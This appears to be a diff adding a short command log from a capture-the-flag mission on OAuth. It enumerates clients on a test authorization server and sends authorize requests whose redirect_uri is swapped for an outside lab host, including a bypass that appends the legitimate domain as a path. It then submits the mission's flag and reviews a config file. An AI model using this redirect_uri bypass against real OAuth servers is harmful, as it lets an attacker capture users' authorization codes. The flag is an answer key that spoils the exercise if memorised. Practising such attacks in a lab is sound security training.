@@ -1,0 +1,9 @@
+# Season 11, mission 5: return to sender
+curl https://auth.comptoir.test/clients
+curl -d "client_id=budgeto&redirect_uri=https://app.budgeto.example/callback" https://auth.comptoir.test/authorize
+curl -d "client_id=budgeto&redirect_uri=https://lab.lignerouge.test/cb" https://auth.comptoir.test/authorize
+curl -d "client_id=budgeto&redirect_uri=https://lab.lignerouge.test/cb/app.budgeto.example" https://auth.comptoir.test/authorize
+submit FLAG{comptoir-retour-a-l-envoyeur-51c4}
+review dossier/auth-config.yml
+review dossier/auth-config.yml 6
+review dossier/auth-config.yml 7
